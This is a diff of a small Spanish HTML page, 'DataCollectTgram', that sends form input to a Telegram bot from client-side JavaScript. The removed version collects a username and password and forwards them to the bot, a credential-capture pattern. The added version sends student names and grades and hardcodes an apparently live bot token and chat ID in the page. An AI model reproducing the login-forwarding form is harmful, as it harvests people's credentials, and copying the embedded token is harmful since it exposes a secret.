@@ -1,47 +1,54 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>DataCollectTgram</title>
 </head>
 <body>
-    <h2>Data Collect de Telegram</h2>
 
-    <input type="text" id="usuario" placeholder="Usuario"><br><br>
-    <input type="password" id="password" placeholder="Contraseña"><br><br>
+<h2>Data Collect de Telegram</h2>
 
-    <button onclick="enviar()">Enviar</button>
+<input type="text" id="usuario" placeholder="Usuario"><br><br>
+<input type="text" id="calificacion" placeholder="Calificación"><br><br>
 
-    <script>
-        function enviar() {
-            const usuario = document.getElementById("usuario").value;
-            const password = document.getElementById("password").value;
+<button onclick="enviar()">Enviar</button>
 
-            const token = "";
-            const chatId = "";
+<script>
+function enviar() {
+    const usuario = document.getElementById("usuario").value;
+    const calificacion = document.getElementById("calificacion").value;
 
-            const mensaje = `Login de prueba:\nUsuario: ${usuario}\nPassword: ${password}`;
+    const token = "8084779862:AAEpFTpBIKMhiwy_wwIsVB6gnXvR1ZCAHyE";
+    const chatId = 8450180391; // ✔️ ES CORRECTO
 
-            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+    const mensaje = `📚 Registro escolar\nAlumno: ${usuario}\nCalificación: ${calificacion}`;
 
-            fetch(url, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: mensaje
-                })
-            })
-            .then(() => {
-                alert("Datos enviados");
-            })
-            .catch(() => {
-                alert("Error al enviar");
-            });
+    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            chat_id: chatId,
+            text: mensaje
+        })
+    })
+    .then(res => res.json())
+    .then(data => {
+        console.log(data);
+        if (data.ok) {
+            alert("Datos enviados a Telegram ✅");
+        } else {
+            alert("Error de Telegram ❌");
         }
-    </script>
+    })
+    .catch(err => {
+        console.error(err);
+        alert("Error de red");
+    });
+}
+</script>
+
 </body>
 </html>
